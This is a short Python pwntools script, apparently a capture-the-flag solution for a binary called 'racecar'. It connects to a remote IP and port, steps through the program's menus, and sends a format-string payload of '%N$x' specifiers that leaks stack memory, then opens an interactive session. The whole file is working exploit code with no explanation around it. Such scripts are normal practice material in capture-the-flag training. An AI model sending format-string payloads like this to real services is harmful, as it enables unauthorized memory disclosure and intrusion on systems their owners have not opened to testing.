#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

# p = process('./racecar')
p = remote('139.59.175.51', 30616)
elf = ELF('./racecar')

p.recvuntil(b'Name: ')
p.sendline(b'pwn')
p.recvuntil(b'Nickname: ')
p.sendline(b'pwn')
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')
p.sendline(b'2')
p.recvuntil(b'> ')

payload = b'%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x'
p.sendline(payload)

p.interactive()
